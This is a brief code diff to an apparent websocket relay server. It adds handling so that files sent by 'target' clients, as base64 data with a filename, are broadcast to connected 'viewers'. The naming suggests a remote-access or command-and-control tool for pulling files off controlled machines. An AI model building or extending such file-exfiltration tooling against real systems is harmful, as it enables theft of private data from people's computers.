@@ -306,6 +306,14 @@ async def websocket_handler(scope, receive, send):
                             "path": payload.get("path", ""),
                             "files": payload.get("files", [])
                         })
+                elif msg_type == "file_download" and client_type == "target":
+                    if current_user_instance:
+                        await broadcast_to_viewers({
+                            "type": "file_recv",
+                            "user": current_user_instance.name,
+                            "data_b64": payload.get("data_b64", ""),
+                            "filename":payload.get("filename", "")
+                        })
                     
     except Exception as e:
         logging.error(f"WebSocket Error: {e}")
